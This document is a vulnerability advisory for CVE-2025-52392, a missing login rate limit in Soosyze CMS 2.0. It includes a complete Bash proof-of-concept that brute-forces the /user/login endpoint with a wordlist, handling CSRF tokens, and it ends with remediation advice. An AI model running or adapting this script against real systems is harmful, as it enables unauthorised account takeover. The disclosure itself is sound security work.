# Brute Force Login Vulnerability in Soosyze CMS 2.0 (CVE-2025-52392)

### Affected Component

`/user/login` endpoint – Authentication Controller

### CWE

[CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)

### Description

Soosyze CMS 2.0 is vulnerable to a brute-force authentication attack due to missing rate limiting and account lockout mechanisms on the \`/user/login\` endpoint.

An attacker can send unlimited login attempts without any restriction, allowing them to guess user credentials — including administrative accounts — via automated tools.

This issue was confirmed using a custom proof-of-concept script and the `rockyou.txt` wordlist to perform repeated POST requests against the login endpoint with a fixed username and varying passwords. &#x20;

The same result can be reproduced with tools such as **THC Hydra** or **Burp Suite Intruder**. The vulnerability remains unpatched, and no vendor response has been received at the time of publication.

### Impact

An attacker could gain unauthorized access to any account, including administrator accounts, potentially leading to full compromise of the CMS instance.

### Proof of Concept (PoC)

#### Overview

The following PoC demonstrates a brute-force authentication vulnerability in **Soosyze CMS 2.0** at the `/user/login` endpoint.\
The issue is caused by **missing rate limiting and account lockout mechanisms**, allowing an attacker to try unlimited password guesses.

#### Steps to Reproduce

1. Deploy or access a Soosyze CMS 2.0 instance.
2. Identify a valid username or email address (`test@test.com` in this example).
3. Prepare a password wordlist (e.g., `rockyou.txt`).
4. Execute the provided Bash script to perform automated login attempts.

#### PoC Script

```bash
#!/usr/bin/env bash
# Author: Beatriz Fresno Naumova (@beafn28)
# Usage:
#   ./script.sh [wordlist.txt]
# If no wordlist is provided, a dictionary will be used.

set -euo pipefail

BASE_URL="http://localhost:8000"
LOGIN_PATH="/user/login"
EMAIL_FIELD="email"
PASS_FIELD="password"
TARGET_EMAIL="test@test.com"

WORDLIST_FILE="${1:-}"
DEFAULT_WORDS=("123456" "admin" "password" "qwerty" "letmein" "admin123" "password1")

form_url="$BASE_URL$LOGIN_PATH"
COOKIE_JAR="$(mktemp)"

get_form() {
    curl -sS -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$form_url" > /tmp/login_page.html
}

extract_token() {
    local name value
    name=$(sed -nE 's/.*name="([_a-zA-Z0-9:-]*(token|csrf)[_a-zA-Z0-9:-]*)".*type="hidden".*/\1/p' /tmp/login_page.html | head -n1 || true)
    value=""
    if [[ -n "$name" ]]; then
        value=$(sed -nE "s/.*name=\"$name\".*value=\"([^\"]*)\".*/\1/p" /tmp/login_page.html | head -n1 || true)
    fi
    printf '%s\t%s\n' "$name" "$value"
}

post_login() {
    local pass="$1" tname="$2" tval="$3"
    curl -sS -o /tmp/resp.html -w "%{http_code}" \
        -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
        -X POST "$form_url" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Origin: $BASE_URL" -H "Referer: $form_url" \
        --data-urlencode "$EMAIL_FIELD=$TARGET_EMAIL" \
        --data-urlencode "$PASS_FIELD=$pass" \
        $( [[ -n "$tname" && -n "$tval" ]] && printf -- '--data-urlencode %s=%s' "$tname" "$tval" )
}

echo "[*] Starting brute-force attack on $form_url"
[[ -n "$WORDLIST_FILE" && -r "$WORDLIST_FILE" ]] && mapfile -t words < "$WORDLIST_FILE" || words=("${DEFAULT_WORDS[@]}")

i=0
for pw in "${words[@]}"; do
    i=$((i+1))
    get_form
    IFS=$'\t' read -r TOKEN_NAME TOKEN_VALUE < <(extract_token)
    code=$(post_login "$pw" "$TOKEN_NAME" "$TOKEN_VALUE")

    if grep -q '"redirect"' /tmp/resp.html; then
        echo -e "[$i] Password found: '\e[1m$pw\e[0m' (HTTP $code)"
        break
    else
        echo "[$i] '$pw' (HTTP $code)"
    fi

    sleep 0.$((RANDOM%9+1))
done

rm -f "$COOKIE_JAR" /tmp/resp.html
```

#### Execution example

```
./poc.sh rockyou.txt
```

<figure><img src="../.gitbook/assets/image (1679).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Captura de pantalla 2025-08-12 a las 21.12.29.png" alt=""><figcaption></figcaption></figure>

### Remediation

* Implement rate limiting (e.g., limit failed login attempts to 5 per minute per IP).
* Introduce account lockout after repeated failed login attempts.
* Consider adding CAPTCHA after several failed attempts.

### Discoverer

Beatriz Fresno Naumova (@beafn28)

### References

* CVE: [CVE-2025-52392](https://www.cve.org/CVERecord?id=CVE-2025-52392)
